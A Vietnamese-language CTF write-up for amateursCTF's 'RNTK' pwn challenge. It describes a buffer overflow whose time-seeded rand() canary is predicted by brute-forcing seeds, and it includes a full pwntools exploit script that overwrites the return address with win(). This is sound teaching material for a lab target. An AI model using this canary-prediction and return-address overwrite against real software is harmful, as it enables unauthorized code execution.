# RNTK

## Overview

![img](/amateursCTF/Pwn/rntk/assets/des.png)

- Bài cho chúng ta 2 file `chal` và `Dockerfile` và nhắc đến hàm sinh ngẫu nhiên.

- Như thường lệ thì mình sẽ kiểm tra file `chal` sau đó cho file `chal` vào IDA để disassemble.
</br>![img](/amateursCTF/Pwn/rntk/assets/info.png)

- Hàm main:
</br>![img](/amateursCTF/Pwn/rntk/assets/ida.png)

- Sau một hồi lục soát thì mình nhận thấy chương trình có hàm `win()` in ra flag và hàm `random_guess()` bị buffer overflow.

- Hàm `win()`:
</br>![img](/amateursCTF/Pwn/rntk/assets/win.png)

- Hàm `random_guess()`:
</br>![img](/amateursCTF/Pwn/rntk/assets/random_guess.png)

- Giá trị của `global_canary` được sinh ra từ giá trị trả về của lời gọi hàm `rand()` trong hàm `generate_canary()`:
</br>![img](/amateursCTF/Pwn/rntk/assets/gen_can.png)

- Như vậy ta có thể tóm tắt lại luồng thực thi của chương trình là ban đầu chương trình sẽ tạo ra giá trị `global_canary` bằng hàm `rand()` với `srand(time(0))`, sau đó chương trình sẽ in ra menu và cho chúng ta chọn 1 trong 3 lựa chọn:
    - 1 là sẽ sinh ra giá trị ngẫu nhiên bằng hàm `rand()` và in nó ra màn hình.
    - 2 là sẽ cho chúng ta nhập input (bị buffer overflow) và chương trình sẽ kiểm tra với `global_canary` sau đó in ra thông báo số đó có giống hay không.
    - lựa chọn 3 là thoát.

## Idea

- Mình sẽ sử dụng lỗi buffer overflow ở hàm `random_guess()` để ghi đè RET của hàm thành địa chỉ của hàm `win()`, khi đó, sau khi hàm thực hiện xong, hàm `win()` sẽ được gọi.

- Tuy nhiên ta cần phải vượt qua lệnh `if` kiểm tra `global_canary` để chương trình ko gọi đến hàm `exit()`.

- Với những bài như này, mình thường sẽ sử dụng ngôn ngữ C, đầu tiền sẽ chạy `sleep()` 1 2 s gì đó để sau đó chạy `time(0)` sẽ đồng thời với server, tiếp theo chỉ cần truyền vào `srand()` là ta có thể lấy được những giá trị tiếp theo của `rand()`. Nhưng bài này lần đầu tiên mình sử dụng thư viện `CDLL` của python thì không được..

- Nên sau đó từ tham khảo của anh Quốc Anh, mình đã có ý tưởng sau.

- với mỗi `seed` thì khả năng cao giá trị của 2 `rand()` liên tiếp sẽ không bị trùng, do đó ta có thể lấy bắt đầu từ `i = time(0)` thử các giá trị `i+1, i+2, i+3, ...` làm `seed` cho `srand()`, nếu giá trị nào cho ra 2 lần `rand()` trùng với 2 giá trị lấy từ server thì khi đó `i + m` đó chính là `seed`.

## Script

```python
from pwn import *
from ctypes import CDLL

win_addr = 0x4012B6
libc = CDLL("libc.so.6")

p = remote("amt.rs", 31175)
t = libc.time(0)

libc.srand(t)
glob = 0

p.sendline(b"1")
p.recvuntil(b"3) Exit\n")
s1 = int(p.recvline().strip(), 10)
p.sendline(b"1")
p.recvuntil(b"3) Exit\n")
s2 = int(p.recvline().strip(), 10)

for i in range(t, t+200):
    print("tried seed " + str(i))
    libc.srand(i)
    glob = libc.rand()
    t1 = libc.rand()
    t2 = libc.rand()
    if (s1 == t1 and s2 == t2):
        print("seed is " + str(i))
        break

payload = str(t1).encode() + b"a"*(0x30-len(str(t1))-4) + p32(glob) + b"a"*8 + p64(win_addr)

p.sendline(b"2")
p.sendline(payload)

p.interactive()
```

## Result

![img](/amateursCTF/Pwn/rntk/assets/ersult.png)


>### Flag: amateursCTF{r4nd0m_n0t_s0_r4nd0m_after_all}